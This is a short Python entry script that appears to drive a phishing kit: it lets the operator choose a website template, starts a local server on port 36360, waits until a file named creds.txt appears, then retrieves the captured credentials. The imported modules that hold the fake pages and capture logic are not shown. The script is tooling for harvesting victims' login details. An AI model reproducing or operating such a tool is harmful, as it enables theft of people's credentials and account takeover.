from core.main import *
from core.doge import col_exit
import os
try:
    os.system('clear')
    startup()
    stop_services()
    intro()
    selected = web_list()
    start_server('36360',selected)
    #================
    while 1:
        cr = os.path.exists('./server/creds.txt')
        if cr==True:
            break
    #================
    get_creds()
    stop_services()

except KeyboardInterrupt:
    col_exit('KeyboardInterrupt')
